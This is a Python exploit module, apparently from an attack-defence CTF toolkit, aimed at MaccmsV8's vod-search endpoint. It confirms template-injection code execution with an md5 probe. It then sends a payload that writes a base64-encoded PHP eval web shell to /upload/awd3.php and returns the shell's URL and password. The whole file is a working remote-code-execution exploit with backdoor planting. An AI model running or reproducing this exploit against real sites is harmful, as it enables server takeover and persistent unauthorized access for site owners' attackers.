# -*- coding: utf-8 -*-
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from configuration import configuration
from utils import Utils
import re


class P(Payload):
    def attack(self):
        try:
            url = 'http://{0}/index.php?m=vod-search'.format(self.host)
            print(url)
            res = requests.post(url,data={
                'wd':'{if-A:print(md5(a))}{endif-A}'
            },timeout=2)
            if not res.status_code == 200 or Utils.md5('a') not in res.text:
                raise PayloadFailException('MaccmsV8 not satisfied')
            print('MaccmsV8 success')
            shellPath = '/upload/awd3.php'
            shellLocation = configuration.webRoot + shellPath
            shellLocation = Utils.base64(shellLocation).strip('=').strip('+')
            payload = 'wd={if-A:print(fputs(fopen(base64_decode('+shellLocation+'),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2FtXSk7Pz4x)))}{endif-A}' 
            print(payload)
            res = requests.post(url,data={
                'wd':payload
            },timeout=2)
            shellUrl = 'http://'+self.host+shellPath
            res = requests.get(shellUrl)
            if res.status_code==200:
                return shellUrl,'am'
        except PayloadFailException:
            raise
        except:
            raise PayloadFailException